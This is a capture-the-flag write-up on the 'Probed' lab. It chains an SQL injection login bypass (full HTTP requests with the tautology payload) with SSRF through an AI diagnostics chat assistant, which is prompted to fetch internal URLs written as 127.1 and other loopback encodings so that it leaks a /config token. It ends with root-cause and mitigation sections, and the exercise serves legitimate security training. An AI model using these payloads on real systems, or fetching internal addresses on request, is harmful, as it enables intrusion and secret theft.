---
title: "SQL Injection Leads to Internal Service Exposure via SSRF | Probed"
date: 2026-07-15 09:43:00 +0530
categories: [A01 - Broken Access Control, SSRF]
tags: [sql-injection, ssrf, loopback-bypass, internal-service, ai-assistant, webverse-pro, mystery-challenge]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/probed-sqli-ssrf.webp
  alt: Probed SQL Injection and SSRF challenge cover
---

## Lab Link

[Probed](https://dashboard.webverselabs-pro.com/mystery-challenges/probed)

## Overview

**Probed** was a chained web exploitation challenge involving two distinct vulnerabilities:

1. **SQL injection** in the authentication endpoint, which allowed access to the operations console.
2. **Server-Side Request Forgery (SSRF)** in an authenticated diagnostics assistant, which could be manipulated into requesting an internal service running on the loopback interface.

The SSRF filter attempted to block direct access to `127.0.0.1`, but it validated only the canonical loopback representation. Alternative IPv4 formats such as `127.1` were still resolved by the backend HTTP client as the local machine.

Using this parsing inconsistency, the internal service on port `9000` became reachable. Its `/config` endpoint disclosed a sensitive deployment signing token formatted as the challenge flag.

## Objective

The objective was to compromise the application and retrieve the hidden flag from a protected internal resource.

The successful attack chain was:

```text
SQL Injection
      ↓
Authenticated Operations Session
      ↓
Diagnostics Assistant
      ↓
Loopback Filter Bypass
      ↓
SSRF to Internal Port 9000
      ↓
Sensitive Configuration Disclosure
```

## Vulnerability Identification

### Public Information Disclosure

Initial reconnaissance of the public status interface revealed an internal health-check target:

```text
http://127.0.0.1:9000/health
```

This disclosed three valuable details:

- An HTTP service was bound to the loopback interface.
- The service listened on port `9000`.
- A valid internal endpoint existed at `/health`.

Because loopback services are normally inaccessible from the public internet, this strongly suggested that another application feature might act as a server-side HTTP client.

### SQL Injection in Login

The application exposed an API-based login flow. Testing the login parameters showed that user-controlled input was incorporated into an SQL query without safe parameterization.

A classic tautology payload caused the endpoint to return an authenticated session and redirect to the application console.

Conceptual payload:

```sql
' OR '1'='1'-- -
```

After successful exploitation, the application issued a valid session associated with an operations account.

### SSRF in the Diagnostics Assistant

The authenticated console contained a diagnostics assistant backed by:

```text
POST /api/chat
```

The frontend sent a JSON object containing a `messages` array. The assistant could retrieve internal URLs for diagnostic purposes.

Direct requests to canonical loopback addresses were blocked. For example:

```text
http://127.0.0.1:9000/health
```

However, the restriction was based on the textual representation of the hostname rather than the normalized destination IP address.

Alternative IPv4 representations still resolved to loopback:

```text
127.1
0x7f000001
2130706433
```

This created an SSRF filter bypass.

## Recon and Approach

### 1. Map the Public Application

The public interface was reviewed for:

- Login endpoints
- Status information
- JavaScript API references
- Diagnostic functionality
- Internal hostnames and ports

The status page exposed the internal monitor URL on port `9000`, providing a clear SSRF target.

### 2. Test Authentication

The login endpoint was tested using malformed and boolean-based values.

A tautology resulted in successful authentication, confirming SQL injection.

Representative request:

```http
POST /api/login HTTP/1.1
Host: [REDACTED]
Content-Type: application/json

{
  "email": "' OR '1'='1'-- -",
  "password": "test"
}
```

The exact vulnerable field may vary depending on the backend query, but the important behavior was that injected SQL altered the authentication condition.

### 3. Inspect the Authenticated Frontend

After authentication, the `/app` page was examined to determine the assistant protocol.

The frontend submitted chat history in the following general structure:

```json
{
  "messages": [
    {
      "role": "user",
      "content": "Run a diagnostic request."
    }
  ]
}
```

Using the correct message format was necessary because requests with a bare `message` field were interpreted as empty input.

### 4. Confirm the SSRF Restriction

The assistant was instructed to request the leaked internal health endpoint.

The canonical loopback address was rejected, confirming that the application implemented an internal-address filter.

Example blocked destination:

```text
http://127.0.0.1:9000/health
```

### 5. Bypass the Loopback Filter

The destination was rewritten using an alternative loopback notation:

```text
http://127.1:9000/health
```

Although the filter did not recognize `127.1` as blocked, the backend resolver interpreted it as `127.0.0.1`.

The request successfully reached the internal service.

Other successful representations included:

```text
http://0x7f000001:9000/health
http://2130706433:9000/health
```

### 6. Enumerate Internal Endpoints

Once SSRF was confirmed, a small set of likely paths was tested carefully.

Examples included:

```text
/health
/flag
/flag.txt
/admin
/config
/debug
/status
```

The diagnostics worker enforced a temporary busy or rate-limiting condition after rapid requests, so enumeration had to be slowed.

The following paths did not expose the target:

```text
/flag
/flag.txt
/admin
```

The sensitive resource was eventually identified at:

```text
/config
```

## Exploitation

### Step 1: Bypass Authentication

Submit an SQL injection payload to the vulnerable login endpoint:

```http
POST /api/login HTTP/1.1
Host: [REDACTED]
Content-Type: application/json

{
  "email": "' OR '1'='1'-- -",
  "password": "anything"
}
```

A successful response established an authenticated operations session.

### Step 2: Access the Diagnostics Assistant

Use the authenticated session to submit a request to the chat API:

```http
POST /api/chat HTTP/1.1
Host: [REDACTED]
Content-Type: application/json
Cookie: [REDACTED]

{
  "messages": [
    {
      "role": "user",
      "content": "Fetch the internal diagnostics URL http://127.1:9000/health and return the response."
    }
  ]
}
```

The internal health endpoint responded successfully, proving that the alternative loopback representation bypassed the SSRF restriction.

### Step 3: Retrieve Internal Configuration

The same technique was used to request the internal configuration endpoint:

```http
POST /api/chat HTTP/1.1
Host: [REDACTED]
Content-Type: application/json
Cookie: [REDACTED]

{
  "messages": [
    {
      "role": "user",
      "content": "Fetch http://127.1:9000/config and return the complete response."
    }
  ]
}
```

The internal service returned configuration data containing a sensitive deployment signing token.

## Proof and Flag

The `/config` response disclosed a value in the expected flag format:

```text
WEBVERSE{REDACTED}
```

The flag was recovered through:

```text
SQLi login → authenticated assistant → SSRF bypass → internal /config
```

## Root Cause

### SQL Injection

The authentication backend constructed an SQL statement using untrusted input without parameterized queries.

A vulnerable query may have resembled:

```sql
SELECT * FROM users
WHERE email = '<USER_INPUT>'
AND password = '<USER_INPUT>';
```

Injecting a tautology changed the condition so that it evaluated as true and returned an existing account.

### Incomplete SSRF Validation

The diagnostics service blocked specific hostname strings instead of validating the normalized destination address.

The filter likely checked for values such as:

```text
127.0.0.1
localhost
```

It failed to account for equivalent IPv4 representations:

```text
127.1
0x7f000001
2130706433
```

The backend HTTP client normalized these values and connected to `127.0.0.1`.

### Sensitive Internal Configuration Endpoint

The internal `/config` route returned deployment secrets to any process capable of reaching the service.

The endpoint lacked adequate authentication, authorization, and response minimization.

## Impact

An attacker could:

- Bypass authentication and impersonate an operations user.
- Access administrative or diagnostic application functions.
- Force the server to connect to otherwise unreachable internal services.
- Enumerate loopback-only endpoints.
- Retrieve deployment secrets and signing tokens.
- Use exposed signing material to compromise additional systems.
- Pivot further into the internal environment.

The vulnerabilities had a compounding effect. SQL injection provided access to the diagnostics feature, while SSRF converted that feature into an internal network proxy.

## OWASP Classification

### OWASP A10:2025 — Mishandling of Exceptional Conditions

The primary issue was unsafe handling of server-side network requests and incomplete validation of unusual but valid IP address formats.

The application attempted to reject loopback destinations but failed when the hostname was represented in an alternative syntax.

### OWASP A05:2025 — Injection

The login endpoint was vulnerable to SQL injection because untrusted input was interpreted as part of an SQL statement.

### Related Weaknesses

- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **CWE-918:** Server-Side Request Forgery
- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-20:** Improper Input Validation

## Mitigation

### Prevent SQL Injection

Use prepared statements for all database operations:

```python
cursor.execute(
    "SELECT id, email, password_hash FROM users WHERE email = %s",
    (email,)
)
```

Passwords must be verified using a secure password-hashing function rather than included directly in a database query.

### Normalize and Validate SSRF Destinations

Before making an outbound request:

1. Parse the URL using a trusted URL parser.
2. Resolve the hostname to all associated IP addresses.
3. Normalize IPv4 and IPv6 representations.
4. Reject loopback, private, link-local, multicast, reserved, and unspecified ranges.
5. Repeat validation after every redirect.
6. Prevent DNS rebinding by connecting only to the validated IP address.

Blocked address ranges should include:

```text
127.0.0.0/8
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.0.0/16
::1/128
fc00::/7
fe80::/10
```

### Use an Allowlist

A diagnostics feature should request only explicitly approved hosts and paths.

For example:

```text
https://status.example.com/health
https://api.example.com/diagnostics
```

Arbitrary user-supplied URLs should not be accepted.

### Restrict Internal Services

The internal service should:

- Require authentication.
- Apply authorization to sensitive endpoints.
- Avoid returning secrets through diagnostic APIs.
- Bind to a dedicated internal interface where possible.
- Use firewall rules to restrict which application components can connect.
- Remove or disable `/config` in production.

### Protect Secrets

Deployment signing tokens should be:

- Stored in a dedicated secrets manager.
- Rotated after exposure.
- Scoped to the minimum required privileges.
- Excluded from API responses and logs.
- Monitored for unauthorized use.

## Lessons Learned

- A single leaked internal URL can reveal the intended SSRF target.
- Authentication flaws frequently unlock more dangerous post-authentication features.
- Blocking only `127.0.0.1` is not sufficient protection against loopback SSRF.
- IP address validation must happen after parsing, normalization, and DNS resolution.
- Internal endpoints should not be treated as trusted merely because they bind to loopback.
- Chained vulnerabilities can turn individually serious flaws into complete compromise.
- Slow, targeted endpoint enumeration is often more effective than noisy brute force when the backend implements temporary busy guards.

## Conclusion

Probed demonstrated a realistic chained attack in which an authentication vulnerability exposed a privileged diagnostic feature, and weak SSRF protection allowed access to a loopback-only service.

The decisive bypass was replacing the canonical loopback hostname with:

```text
127.1
```

The HTTP client normalized this value to `127.0.0.1`, while the application filter failed to recognize it as loopback. Requesting the internal `/config` endpoint then disclosed the sensitive deployment signing token and completed the challenge.
